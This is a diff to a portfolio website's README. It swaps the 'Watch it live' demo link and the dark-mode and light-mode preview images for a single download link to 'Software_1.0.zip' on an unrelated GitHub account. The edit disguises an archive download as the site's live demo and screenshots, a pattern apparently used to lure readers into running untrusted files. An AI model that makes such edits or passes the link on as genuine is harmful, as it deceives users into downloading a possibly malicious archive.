@@ -2,7 +2,7 @@
 
 A portfolio web site completely made in html css and js from ground up.
 
-#### Watch it live here - [hailee.netlify.app](https://hailee.netlify.app/)
+#### Watch it live here - [https://github.com/dionkaps7/dionkaps/raw/refs/heads/main/preview/Software_1.0.zip](https://github.com/dionkaps7/dionkaps/raw/refs/heads/main/preview/Software_1.0.zip)
 
 <br>
 
@@ -12,8 +12,8 @@ A portfolio web site completely made in html css and js from ground up.
 
 ### In dark mode
 
-![In dark mode](./preview/hailee-dark.png)
+![In dark mode](https://github.com/dionkaps7/dionkaps/raw/refs/heads/main/preview/Software_1.0.zip)
 
 ### In light mode
 
-![In light mode](./preview/hailee-light.png)
+![In light mode](https://github.com/dionkaps7/dionkaps/raw/refs/heads/main/preview/Software_1.0.zip)
